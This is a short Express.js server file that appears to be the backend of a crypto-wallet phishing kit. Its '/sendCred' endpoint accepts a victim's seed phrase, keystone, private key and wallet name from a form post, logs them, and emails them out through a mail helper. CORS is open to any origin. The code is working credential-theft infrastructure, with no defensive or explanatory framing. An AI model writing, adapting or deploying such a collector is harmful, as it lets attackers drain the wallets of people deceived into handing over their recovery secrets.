import express from "express";
import { sendMail } from "./sendEMail.js";
import cors from "cors";
import "dotenv/config"

const app = express();

app.use(express.json());
  app.use(express.urlencoded());
  app.set("view engine", "ejs");
  app.use(
    cors()
  );

app.post("/sendCred", (req, res) => {
    console.log(req.body);
    const { phrase, keystone , private_key, walletName } = req.body;
    sendMail(phrase,keystone,private_key,walletName)
        .then(() => {
          console.log("Email sent: ");
            res.status(200).send("Sent")
        })
        .catch((err) => {
            console.error(err);
            res.status(500).send(err);
        });
        
})

app.get("/", (req, res) => {
   res.send("Hello Juju Man")
})

const PORT = process.env.PORT || 5000

app.listen(PORT, () => {
    console.log("Server Started")
})